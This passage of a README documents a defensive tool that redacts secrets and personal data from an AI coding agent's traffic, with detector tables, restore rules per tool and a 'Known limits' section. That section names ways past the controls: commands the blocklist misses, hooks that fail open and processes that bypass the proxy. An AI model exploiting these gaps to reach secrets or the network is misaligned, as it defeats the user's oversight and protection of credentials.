| `SECRET` | Any value under a secret-like key (`password`, `*_TOKEN`, `api_key`, `client_secret`, `dsn`, `auth`, `basicAuthenticationPassword`, …). This applies across YAML, .env, .properties, JSON, ini, TOML, XML, HCL, CLI flags and logs, and includes `${NAME:default}` defaults. Also covered: Kubernetes/ECS `name:`/`value:` env pairs; YAML block scalars (`password: \|`); .NET `<add key=… value=…/>`; Terraform `sensitive` outputs; `.pgpass` lines; Kubernetes `Secret` data, plus the decoded value. Keys written obfuscated are caught too: zero-width characters, Cyrillic look-alikes, `&#61;`, `\u0077`, and `"a" + "b"` concatenation. So are prose ("the password is …", `şifre: …`, "veritabanı şifresi …", `parola: …`), URI passwords, token-only URL userinfo, `Authorization`/`Cookie` headers, known token formats, JWTs and high-entropy strings |
| `PRIVKEY` | PEM/OpenSSH/PGP private key blocks, also inside escaped JSON, and key body lines read without the `BEGIN` line |
| `USER` | Keyed usernames (`db_user`, `basicAuthUsername`), URI user parts, `ssh deploy@host`, `/home/<you>/` paths, users in DB error messages (`for user "orders_admin"`, `'root'@'10.0.0.9'`) |
| `PERSON` | Git identities (see the FAQ), plus your names list |
| `EMAIL`, `PHONE` | Emails (with an allowlist for bots); Turkish mobiles (`+90 5xx`) and landlines (`0212 555 12 34`), international numbers |
| `IP`, `IPPRIV`, `IPV6` | All non-loopback addresses. Private ranges stay distinguishable, so Claude can still reason about the network |
| `HOST` | Hosts under `*.internal`, `*.corp`, `*.local`, …, your domains, managed cloud DB endpoints (`*.rds.amazonaws.com`, `*.database.windows.net`, `*.mongodb.net`, …), the host part of values under URL-, address- and host-like keys (`jdbc:` URLs included), and hosts in DB error messages. Public hosts (github.com, maven central, …) stay readable |
| `TCKN`, `VKN`, `IBAN`, `CARD` | Labelled numbers are always hidden (`VKN: …`, `vergi no`, `TC kimlik no`, `tax_id=`), also with spaces or dashes (`TC 100 000 001 46`). Unlabelled ones are hidden only when checksum-valid (TCKN/VKN, IBAN mod-97 in any case, Luhn including Diners and dotted cards). Unlabelled 10-digit numbers in the Unix-timestamp range, or starting with 5, are left alone |
| `CUSTOM` | Your regexes |

Works on Claude Code's Read output (`12<tab>line`) and `grep -n` output (`file:12:line`) exactly as on plain files. The `file:` prefixes are checked too, since a path can hold a hostname.

- **Exact-match memory:** once a value has been seen in context, it's replaced *everywhere*, e.g. the DB password showing up bare in a stack trace. For random-looking secrets that includes other letter cases, inside longer words, and their base64 forms. This survives restarts (the vault is encrypted at rest). Dictionary-word defaults like `postgres` aren't replaced everywhere, so "we run postgres 16" stays readable. Single-label hostnames (`http://kafka:9092`) are replaced only where they're used as a host, so `eureka.client.*` keys stay intact.
- **Allowlisting a value without writing it down:** run `python -m redact_guard digest`, type the value (it isn't echoed or saved), then put the printed hash under `detectors.allow_digests`.
- **Kept readable on purpose:** `${VAR}`, `{{ .Values.x }}`, `secretKeyRef`, `existingSecret: name`, `max_tokens`, type annotations (`Final[str]`), code identifiers (`proxy_auth=proxy_auth`, `host = flow.request.host`), versions, git SHAs, SRI hashes, Unix timestamps. Over-redaction is always safe, because the round trip restores it byte for byte. Under-redaction is the leak, so when in doubt it redacts.

### Where tokens are restored

| Tool category | Restored | Why |
|---|---|---|
| `Edit`, `MultiEdit`, `Write`, `NotebookEdit` | everything | edits to secret-bearing files must land exactly |
| `Read`, `Grep`, `Glob` | everything | local and read-only; the output is re-redacted anyway |
| `Bash`, `PowerShell`, `Monitor` | the `command` (and `cwd`) only: hosts, IPs, users, emails, names. **Never secrets, ID numbers or credential-shaped values** | a command containing a secret token is replaced by an explanatory `exit 126` |
| `WebFetch`, `WebSearch`, `mcp__*`, and every other tool | nothing | they may leave your machine |
| Claude's visible text | everything | shown only in your terminal |

Override per category under `restore:` in the config.

---

## Known limits (read this)

- **Detection is best effort.** A random string under a neutral key (`X=Zq8!wLm2`) is caught only if it's high-entropy or was already seen somewhere keyed. People's names in prose, hostnames outside your configured domains (`db-prod-01`), and IPs written in decimal, hex or full-width digits aren't recognised. Run `audit` and `scan` on your real files and add domains, names and rules.
- **The command checks are a blocklist.** They catch indirect execution, but not `make db-shell`, `npm run db:query` or a script that already exists. That's why the network boundary and the isolated install matter.
- **Hooks fail open if their interpreter is missing**: Claude Code only blocks on exit code 2. The installers use an absolute path, and the isolated install makes it read-only, but `doctor` is your check.
- **Native Windows:** a process Claude starts that ignores `HTTPS_PROXY` can still reach any host on port 443 unless the VM's network restricts it.
- **Images and PDFs can't be redacted.** They're replaced with a note by default (`binary_blocks: strip`).
- **Thinking blocks are forwarded unchanged**, because their signatures must match. They only ever contain what the model saw, which is tokens.
- **Body rewriting:** redact-guard only changes string *values*, including tool descriptions. It never drops fields or touches `cache_control`, thinking signatures, the first (attribution) system block, or headers. When the vault learns a new value, older history gets re-tokenized once, which costs one prompt-cache miss.
- **Two Claude Code calls go straight to `api.anthropic.com`** in gateway mode: the fast-mode availability check and the WebFetch domain safety check. Neither carries your files. In proxy mode they go through the proxy.
- **Local transcripts** (`~/.claude/projects/*.jsonl`) contain real values, because they record what Claude Code executed. They stay on your disk.
- **Hooks in the e2e test:** the hooks are tested as subprocesses fed the real JSON (including against the real proxy), but the build environment's Claude Code couldn't load hooks, so they were off in the real-CLI runs. Check `/hooks` on your machine.
- **"refused to forward" errors:** the canary found a known value in a field the walker didn't cover. This is the system failing safe. Report the request *shape*, not its content.

---

## Files

```
redact_guard/
  vault.py       deterministic HMAC tokens (12-char, no digit runs), encrypted persistence, key canary markers
  detectors.py   all detectors, in priority order
  engine.py      request walking (messages, tools, unknown blocks), Read/grep prefixes, restore, canary
  exactindex.py  incremental index for the exact-match pass and the canary
  policy.py      restore classes per tool, DB/secret/tunnel/vault blocking, DB files by content (shared with hooks)
  healthproof.py HMAC health proof for the prompt hook
  sse.py         streaming restore (split-token safe; tool input buffered + policed)
  server.py      aiohttp gateway, fail-closed, keepalives during buffering
  egress.py      host allowlist (proxy mode + container mode)
  uplink.py      redaction of Remote Control / other Anthropic uploads (proxy mode)
  mitm_addon.py  proxy mode: mitmproxy addon (decrypts only Anthropic/Claude hosts)
  __main__.py    serve | proxy | scan | audit | doctor | digest
  upstream.py    chaining behind your existing proxy (detection, auth, CA bundle)
  gitleaks.py    Gitleaks rules as a detector (rules/gitleaks.toml, MIT)
  doctor.py      setup checks
hooks/guard.py               PreToolUse + UserPromptSubmit
settings/                    settings template, managed additions, CLAUDE.md snippet
scripts/render_settings.py   print / --apply / --managed
scripts/pre-commit, commit-msg, install-git-hook.sh
scripts/linux/               install-system.sh + redact-guard.service (isolated install)
scripts/windows/             install.ps1 (isolated by default), firewall-block-db.ps1, install-git-hook.ps1
container/                   compose, Dockerfiles, container settings
config/                      host + container configs
docs/                        SECURITY-REVIEW.md (attack checklist), REVIEW-FINDINGS.md (findings + status)
tests/                       360 unit/integration tests; e2e/run.sh, run_proxy.sh, run_chain.sh (real Claude Code CLI)
```
